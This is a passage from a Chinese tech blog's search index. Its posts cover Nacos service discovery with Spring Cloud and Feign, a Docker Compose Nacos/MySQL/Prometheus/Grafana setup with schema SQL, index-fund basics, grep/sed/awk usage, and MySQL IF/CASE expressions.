spring.application.name=service-provider spring.cloud.nacos.discovery.server-addr=127.0.0.1:8848 3、启用服务发现,并编写测试接口\n@SpringBootApplication @EnableDiscoveryClient public class NacosProviderApplication { public static void main(String[] args) { SpringApplication.run(NacosProviderApplication.class, args); } @RestController class EchoController { @RequestMapping(value = \u0026#34;/echo/{string}\u0026#34;, method = RequestMethod.GET) public String echo(@PathVariable String string) { return \u0026#34;Hello Nacos Discovery \u0026#34; + string; } } } 服务消费 # 1、添加依赖\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-netflix-ribbon\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2、配置Nacos地址\nserver.port=8080 spring.application.name=service-consumer spring.cloud.nacos.discovery.server-addr=127.0.0.1:8848 3、启用服务发现与消费\n@SpringBootApplication @EnableDiscoveryClient public class NacosConsumerApplication { @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } public static void main(String[] args) { SpringApplication.run(NacosConsumerApplication.class, args); } @RestController public class TestController { private final RestTemplate restTemplate; @Autowired public TestController(RestTemplate restTemplate) {this.restTemplate = restTemplate;} @RequestMapping(value = \u0026#34;/echo/{str}\u0026#34;, method = RequestMethod.GET) public String echo(@PathVariable String str) { return restTemplate.getForObject(\u0026#34;http://service-provider/echo/\u0026#34; + str, String.class); } } } 4、使用OpenFeign来调用\nFeign类\n@FeignClient(\u0026#34;service-provider\u0026#34;) public interface RemoteServer { @RequestMapping(value = \u0026#34;/echo/{string}\u0026#34;) String echo(@PathVariable(\u0026#34;string\u0026#34;) String string); } Feign远程调用，要启用@EnableFeignClients\n@SpringBootApplication @RestController @EnableDiscoveryClient @EnableFeignClients public class NacosConsumerApplication { @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } public static void main(String[] args) { SpringApplication.run(NacosConsumerApplication.class, args); } @Resource private RemoteServer remoteServer; @RequestMapping(value = \u0026#34;/feign/echo/{str}\u0026#34;, method = RequestMethod.GET) public String feignEcho(@PathVariable String str) { return remoteServer.echo(str); } } 完结。\n"},{"id":52,"href":"/posts/2022/Nacos%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%90%AD%E5%BB%BA/","title":"Nacos服务的搭建","section":"博客","content":"Nacos 是一个服务注册中心和服务配置中心一体化的组件。需要我们去安装Nacos服务，并运行。\n安装Nacos 服务 # 由于个人比较喜欢使用Docker来搭建各种学习服务，同样，下面也使用Docker来搭建Nacos服务，参考 官方。\n1、Dockerfile文件\nversion: \u0026#39;3.1\u0026#39; services: # mysql 数据库 mysql: container_name: mysql image: mysql:5.7 command: --default-authentication-plugin=mysql_native_password restart: always ports: - 3306:3306 environment: MYSQL_ROOT_PASSWORD: root # Nacos 服务注册中心 nacos: image: nacos/nacos-server:latest container_name: nacos-standalone-mysql env_file: - ./env/nacos-standlone-mysql.env volumes: - ./env/custom.properties:/home/nacos/init.d/custom.properties ports: - \u0026#34;8848:8848\u0026#34; - \u0026#34;9555:9555\u0026#34; depends_on: - mysql restart: on-failure # 搭建prometheus采集Nacos metrics数据 prometheus: container_name: prometheus image: prom/prometheus:latest volumes: - ./env/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml ports: - \u0026#34;9090:9090\u0026#34; depends_on: - nacos restart: on-failure # 搭建grafana图形化展示metrics数据 grafana: container_name: grafana image: grafana/grafana:latest ports: - 3000:3000 restart: on-failure 2、nacos-standlone-mysql.env配置文件\nPREFER_HOST_MODE=hostname # 服务地址模式 MODE=standalone # 服务集群模式 SPRING_DATASOURCE_PLATFORM=mysql # 使用的数据库类型 MYSQL_SERVICE_HOST=mysql # 数据库地址 MYSQL_SERVICE_DB_NAME=nacos_devtest # 数据库名称 MYSQL_SERVICE_PORT=3306 # 端口 MYSQL_SERVICE_USER=root # 用户名 MYSQL_SERVICE_PASSWORD=root #密码 3、prometheus-standalone.yaml\n# my global config global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global \u0026#39;evaluation_interval\u0026#39;. rule_files: # - \u0026#34;first_rules.yml\u0026#34; # - \u0026#34;second_rules.yml\u0026#34; # A scrape configuration containing exactly one endpoint to scrape: # Here it\u0026#39;s Prometheus itself. scrape_configs: # The job name is added as a label `job=\u0026lt;job_name\u0026gt;` to any timeseries scraped from this config. - job_name: \u0026#39;prometheus\u0026#39; # metrics_path defaults to \u0026#39;/metrics\u0026#39; # scheme defaults to \u0026#39;http\u0026#39;. static_configs: - targets: [\u0026#39;localhost:9090\u0026#39;] # 对外访问端口 - job_name: \u0026#39;nacos\u0026#39; metrics_path: \u0026#39;/nacos/actuator/prometheus\u0026#39; static_configs: - targets: [\u0026#39;nacos:8848\u0026#39;] # Nacos服务地址 4、custom.properties\n#spring.security.enabled=false #management.security=false #security.basic.enabled=false #nacos.security.ignore.urls=/** #management.metrics.export.elastic.host=http://localhost:9200 # metrics for prometheus management.endpoints.web.exposure.include=* # metrics for elastic search #management.metrics.export.elastic.enabled=false #management.metrics.export.elastic.host=http://localhost:9200 # metrics for influx #management.metrics.export.influx.enabled=false #management.metrics.export.influx.db=springboot #management.metrics.export.influx.uri=http://localhost:8086 #management.metrics.export.influx.auto-create-db=true #management.metrics.export.influx.consistency=one #management.metrics.export.influx.compressed=true 5、准备完这些之后，我们还需要为Nacos创建一些数据库表, 数据库脚本官网 GITHUB找找，下面我也粘贴出来。\n/* * Copyright 1999-2018 Alibaba Group Holding Ltd. * * Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = config_info */ /******************************************/ CREATE TABLE `config_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(255) DEFAULT NULL, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;修改时间\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;租户字段\u0026#39;, `c_desc` varchar(256) DEFAULT NULL, `c_use` varchar(64) DEFAULT NULL, `effect` varchar(64) DEFAULT NULL, `type` varchar(64) DEFAULT NULL, `c_schema` text, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = config_info_aggr */ /******************************************/ CREATE TABLE `config_info_aggr` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(255) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `datum_id` varchar(255) NOT NULL COMMENT \u0026#39;datum_id\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;内容\u0026#39;, `gmt_modified` datetime NOT NULL COMMENT \u0026#39;修改时间\u0026#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;租户字段\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;增加租户字段\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = config_info_beta */ /******************************************/ CREATE TABLE `config_info_beta` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `beta_ips` varchar(1024) DEFAULT NULL COMMENT \u0026#39;betaIps\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;修改时间\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;租户字段\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info_beta\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = config_info_tag */ /******************************************/ CREATE TABLE `config_info_tag` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `tag_id` varchar(128) NOT NULL COMMENT \u0026#39;tag_id\u0026#39;, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;修改时间\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info_tag\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = config_tags_relation */ /******************************************/ CREATE TABLE `config_tags_relation` ( `id` bigint(20) NOT NULL COMMENT \u0026#39;id\u0026#39;, `tag_name` varchar(128) NOT NULL COMMENT \u0026#39;tag_name\u0026#39;, `tag_type` varchar(64) DEFAULT NULL COMMENT \u0026#39;tag_type\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `nid` bigint(20) NOT NULL AUTO_INCREMENT, PRIMARY KEY (`nid`), UNIQUE KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_tag_relation\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = group_capacity */ /******************************************/ CREATE TABLE `group_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;主键ID\u0026#39;, `group_id` varchar(128) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;Group ID，空字符表示整个集群\u0026#39;, `quota` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;配额，0表示使用默认值\u0026#39;, `usage` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;使用量\u0026#39;, `max_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;单个配置大小上限，单位为字节，0表示使用默认值\u0026#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;聚合子配置最大个数，，0表示使用默认值\u0026#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值\u0026#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;最大变更历史数量\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;修改时间\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_group_id` (`group_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;集群、各Group容量信息表\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = his_config_info */ /******************************************/ CREATE TABLE `his_config_info` ( `id` bigint(64) unsigned NOT NULL, `nid` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `data_id` varchar(255) NOT NULL, `group_id` varchar(128) NOT NULL, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL, `md5` varchar(32) DEFAULT NULL, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39;, `src_user` text, `src_ip` varchar(20) DEFAULT NULL, `op_type` char(10) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;租户字段\u0026#39;, PRIMARY KEY (`nid`), KEY `idx_gmt_create` (`gmt_create`), KEY `idx_gmt_modified` (`gmt_modified`), KEY `idx_did` (`data_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;多租户改造\u0026#39;; /******************************************/ /* 数据库全名 = nacos_config */ /* 表名称 = tenant_capacity */ /******************************************/ CREATE TABLE `tenant_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;主键ID\u0026#39;, `tenant_id` varchar(128) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;Tenant ID\u0026#39;, `quota` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;配额，0表示使用默认值\u0026#39;, `usage` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;使用量\u0026#39;, `max_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;单个配置大小上限，单位为字节，0表示使用默认值\u0026#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;聚合子配置最大个数\u0026#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值\u0026#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;最大变更历史数量\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;修改时间\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;租户容量信息表\u0026#39;; CREATE TABLE `tenant_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `kp` varchar(128) NOT NULL COMMENT \u0026#39;kp\u0026#39;, `tenant_id` varchar(128) default \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `tenant_name` varchar(128) default \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_name\u0026#39;, `tenant_desc` varchar(256) DEFAULT NULL COMMENT \u0026#39;tenant_desc\u0026#39;, `create_source` varchar(32) DEFAULT NULL COMMENT \u0026#39;create_source\u0026#39;, `gmt_create` bigint(20) NOT NULL COMMENT \u0026#39;创建时间\u0026#39;, `gmt_modified` bigint(20) NOT NULL COMMENT \u0026#39;修改时间\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;tenant_info\u0026#39;; CREATE TABLE users ( username varchar(50) NOT NULL PRIMARY KEY, password varchar(500) NOT NULL, enabled boolean NOT NULL ); CREATE TABLE roles ( username varchar(50) NOT NULL, role varchar(50) NOT NULL, constraint uk_username_role UNIQUE (username,role) ); CREATE TABLE permissions ( role varchar(50) NOT NULL, resource varchar(512) NOT NULL, action varchar(8) NOT NULL, constraint uk_role_permission UNIQUE (role,resource,action) ); INSERT INTO users (username, password, enabled) VALUES (\u0026#39;nacos\u0026#39;, \u0026#39;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu\u0026#39;, TRUE); INSERT INTO roles (username, role) VALUES (\u0026#39;nacos\u0026#39;, \u0026#39;ROLE_ADMIN\u0026#39;); 到此，就可以启动Docker,docker-compose up -d 运行服务，然后访问服务 http://服务器地址:8848/nacos/,账号密码是nacos:nacos。\nPrometheus监控中心地址： http://服务器地址:9090/graph。 grafana图形化服务地址: http://服务器地址:3000/,当然，进入grafana后，还需要去连接一下Prometheus监控中心才能够展示出监控的状态信息。\n6、grafana连接Prometheus监控中心\nConfiguration -\u0026gt; Data Sources 选择一个 prometheus的data source进行连接，填写Name 为 prometheus ，Http URL 为你的Prometheus监控中心地址即可。\n# "},{"id":53,"href":"/posts/2022/%E5%9F%BA%E9%87%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","title":"基金的基本知识","section":"博客","content":" 基金的基本知识 # 基金类型 # 基本有货币基金、债券基金和股票基金，其中货币基金的风险最近，同时收益也是最近的；债券基金的风险相对来说是中等的，同时收益也是中等的；最后股票基金是风险最大的，同时，收益也是最大的。\n指数基金 # 巴菲特推荐的基金是指数基金，指数基金是一种特殊的股票基金，它可复制和追踪指数；指数基金追踪指数，按照指数的规则来选股；且是被动投资，无人为因素干扰，透明度高，规则清晰，长期可靠。\n一些基本的描述说明\n1、基金的手续费用：\n指数基金：0.06%-0.08% / 年\n普通基金：0.12%-0.2% / 年\n2、基金代码\nA股基金：6位数字（如：510880 上证红利）\n港股基金：5位数字（如：02828 恒生）\n美股基金：3-5位英文字符（如：apy 标普500）\n3、基金的净值\n一只基金，净值1.5元。是每一份这样的基金份额，其中包含的股票等金融资产，市值 为1.5元。\n如：1元净值和2元净值的基金，买100元基金，1元的净值基金可以买到100股，而2元净值的基金只能买到50股。\n国内的基金净值一般都是1-3元一股的。\n4、场内和场外基金\n场内基金是可以在证券交易所进行买卖交易的基金，场外基金是可以直接在基金交易平台进行申赎的基金。\n5、连接基金\n是基金公司开发的特殊产品，方便没有场内股票账户的投资者也可以投资场内的基金。联接基金也是指数基金。\n6、LOF基金\n是同时可以在场内和场外购买到的基金，它在场内和场外的基金代码都是一致的。\n7、A股/H股\nA股：国内企业在内地上市\nH股：国内企业在香港上市\n8、交易规则\n下午3点是交易的分隔线，3点之前申购和赎回是当天的基金收盘净值成交，3点之后申购和赎回是第二天交易日基金的收盘的净值成交。\n9、交易日和交易时间\n交易日：非节假日的周一到周五\n交易时间：上午9.30 - 11.30 下午13.00 - 15.00\n10、基金性质\nLOF基金：开放型基金，可以随时买入和卖出 FOF基金：投资基金的基金 QDII基金：投资海外股票的基金 基金后面带A：适合长期投资，短期卖出费用很高 基金后面带C：适合短期投资，长期卖出费用很高\n指数类型 # 1、上证50指数\n专门投资大型企业，是从上海交证券易所选择的50家企业。\n参考：华夏上证50ETF 代码510050，易方达上证50 代码110003\n2、沪深300指数\n专门投资大中型企业，是从深圳和上海证券交易所选择的300家企业。\n参考：华泰柏瑞沪深300ETF 代码510300，嘉实沪深300ETF联接160706\n3、中证500指数\n专门投资中小型企业，是从深圳和上海证券交易所选择规模处于301-800位的500家中小型企业。\n参考：南方中证500ETF 代码510500，南方中证500ETF联接 代码 160119\n4、红利指数\n上证红利：从上海证券交易所选现金分红最高的50家公司。\n参考：场内红利ETF 代码510880，\n中证红利：从深圳和上海证券交易所选100家现金分红最高的100家公司。\n参考：场外富国中证红利 代码100032\n红利机会指数：选100只高股息率股票，但是对股票的盈利能力有要求。\n参考：华宝标普中国A股红利机会(LOF) 代码501029\n5、恒生指数\n专门 投资香港上市大型企业\n参考：场内华夏恒生ETF，场外华夏恒生ETF联接\n6、H股指数\n专门投资香港上市内地企业\n参考：场内易方达H股ETF 代码510900，场外易方达H股ETF联接 代码110031\n投资购买 # 使用平台：支付宝的基金平台\n"},{"id":54,"href":"/posts/2022/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%A4%A7%E4%B8%89%E5%88%A9%E5%99%A8grepsedawk/","title":"Linux文本处理大三利器grep、sed、awk","section":"博客","content":" grep # 用于查找文件里符合条件的字符串。\n1、grep [查找内容，支持正则] [文件，支持正则] 2、cat [文件] | grep [查找内容，支持正则]\nsed # 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。\nsed [-hnV] [-e \u0026lt;script\u0026gt;] [-f\u0026lt;script文件\u0026gt;] [文本文件] 参数说明：\n-e\u0026lt;script\u0026gt;或\u0026ndash;expression=\u0026lt;script\u0026gt; 以选项中指定的script来处理输入的文本文件。\n-f\u0026lt;script文件\u0026gt;或\u0026ndash;file=\u0026lt;script文件\u0026gt; 以选项中指定的script文件来处理输入的文本文件。\n-h或\u0026ndash;help 显示帮助。\n-n或\u0026ndash;quiet或\u0026ndash;silent 仅显示script处理后的结果。\n-V或\u0026ndash;version 显示版本信息。\n动作说明：\na ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行) c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行 d ：删除。 i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行) p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行 s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 1、以行为单位的新增/删除\n# 以下只修改了输出的文件流，没有修改原文件，可以使用sed -i -e \u0026#39;2d\u0026#39; test.txt这种方式修改原文件 nl test.txt | sed -e \u0026#39;2,5d\u0026#39; # 删除第二到第五行 nl test.txt | sed -e \u0026#39;2d\u0026#39; # 删除第二行 nl test.txt | sed -e \u0026#39;3,$d\u0026#39; # 删除3到最后一行 nl test.txt | sed -e \u0026#39;2a drink team\u0026#39; # 在第二行后面添加 nl test.txt | sed -e \u0026#39;2a drink team\u0026#39; # 在第二行前面添加 2、以行为单位的替换与显示\nnl test.txt | sed \u0026#39;2,5c replace 2-5\u0026#39; # 替换2-5行内容成replace 2-5 nl test.txt | sed -n \u0026#39;5,7p\u0026#39; # 打印5-7行信息，-n或--quiet或--silent 仅显示script处理后的结果。 3、数据的搜寻并显示\nnl test.txt | sed -n \u0026#39;/content/p\u0026#39; # 查找含有content的行并显示 4、数据的搜寻并删除\nnl test.txt | sed \u0026#39;/content/d\u0026#39; # 查找含有content的行并删除 5、数据的搜寻并执行命令\n# 执行后面花括号中的一组命令，每个命令之间用分号分隔 nl test.txt | sed -n \u0026#39;/9/{s/9/这个是9/g;p}\u0026#39; # 查找9并把9换成‘这个是9’，然后打印。 6、数据的搜寻并替换\nsed \u0026#39;s/要被取代的字串/新的字串/g\u0026#39; # 替换文本 7、多点编辑\nsed -i -e \u0026#39;2i 添加内容\u0026#39; -e \u0026#39;3,4d\u0026#39; test.txt # 添加内容并删除3-4行 8、直接修改文件内容(危险动作)\n# 主要是使用 -i sed -i -e \u0026#39;2d\u0026#39; test.txt # 直接删除文件第二行 awk # 是一种处理文本文件的语言，是一个强大的文本分析工具。\n语法：\nawk [选项参数] \u0026#39;script\u0026#39; var=value file(s) awk [选项参数] -f scriptfile var=value file(s) 用法\n1、正常使用\nawk \u0026#39;{[pattern] action}\u0026#39; {filenames} # 行匹配语句 awk \u0026#39;\u0026#39; 只能用单引号 awk \u0026#39;{print $1,$4}\u0026#39; test.txt # 每行按空格或TAB分割，输出文本中的1、4项 awk \u0026#39;{printf \u0026#34;%-8s %-10s\u0026#34;, $1, $4}\u0026#39; # 格式化输出printf 2、指定分隔符\nawk -F \u0026#39;分隔字符，支持正则\u0026#39; # -F相当于内置变量FS, 指定分割字符 awk -F \u0026#39;,\u0026#39; \u0026#39;{print $1 $2}\u0026#39; test.txt # 以,分隔字符串如：123,45，$1是123，$2是45 3、设置变量\nawk -v # 设置变量 awk -va=1 -vb=s \u0026#39;{print $1,$1+a,$1b}\u0026#39; test.txt "},{"id":55,"href":"/posts/2022/SQL%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/","title":"Sql条件语句","section":"博客","content":" IF表达式 # 语法：IF(expr1, expr2, expr3) 解释：如果expr1结果为true，则使用expr2值，否则使用expr3值。\n使用：\nselect id, name, age, IF(sex=1,\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) as sex from student IFNULL # 语法：IFNULL(expr1, expr2) 解释：如果expr1不为空，则输出expr1的值，否则输出expr2的值。\n使用：\nselect IFNULL(1,0) --输出1 select IFNULL(NULL,0) --输出0 IF ELSEIF ELSE # 语法：\nIF search_condition THEN statement_list [ELSEIF search_condition THEN] statement_list ... [ELSE statement_list] END IF CASE THEN # 语法：\nCASE search_condition WHEN expr1 THEN value1 WHEN expr2 THEN value2 ELSE value3 END 使用：\nSELECT id, name, CASE sex WHEN 1 THEN \u0026#39;男\u0026#39; WHEN 2 THEN \u0026#39;女\u0026#39; ELSE \u0026#39;保密\u0026#39; END AS sex from student 测试数据库语句：\nCREATE TABLE `student` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(20) DEFAULT NULL COMMENT \u0026#39;姓名\u0026#39;, `age` 